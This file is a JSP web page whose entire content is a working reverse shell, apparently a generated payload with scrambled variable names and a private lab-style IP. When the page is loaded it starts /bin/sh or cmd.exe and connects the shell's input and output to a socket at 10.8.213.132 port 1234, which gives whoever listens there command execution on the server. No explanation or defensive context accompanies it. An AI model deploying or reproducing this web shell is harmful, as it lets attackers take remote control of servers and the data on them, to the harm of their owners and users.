<%@page import="java.lang.*"%>
<%@page import="java.util.*"%>
<%@page import="java.io.*"%>
<%@page import="java.net.*"%>

<%
  class StreamConnector extends Thread
  {
    InputStream vR;
    OutputStream b4;

    StreamConnector( InputStream vR, OutputStream b4 )
    {
      this.vR = vR;
      this.b4 = b4;
    }

    public void run()
    {
      BufferedReader xs  = null;
      BufferedWriter ykc = null;
      try
      {
        xs  = new BufferedReader( new InputStreamReader( this.vR ) );
        ykc = new BufferedWriter( new OutputStreamWriter( this.b4 ) );
        char buffer[] = new char[8192];
        int length;
        while( ( length = xs.read( buffer, 0, buffer.length ) ) > 0 )
        {
          ykc.write( buffer, 0, length );
          ykc.flush();
        }
      } catch( Exception e ){}
      try
      {
        if( xs != null )
          xs.close();
        if( ykc != null )
          ykc.close();
      } catch( Exception e ){}
    }
  }

  try
  {
    String ShellPath;
if (System.getProperty("os.name").toLowerCase().indexOf("windows") == -1) {
  ShellPath = new String("/bin/sh");
} else {
  ShellPath = new String("cmd.exe");
}

    Socket socket = new Socket( "10.8.213.132", 1234 );
    Process process = Runtime.getRuntime().exec( ShellPath );
    ( new StreamConnector( process.getInputStream(), socket.getOutputStream() ) ).start();
    ( new StreamConnector( socket.getInputStream(), process.getOutputStream() ) ).start();
  } catch( Exception e ) {}
%>
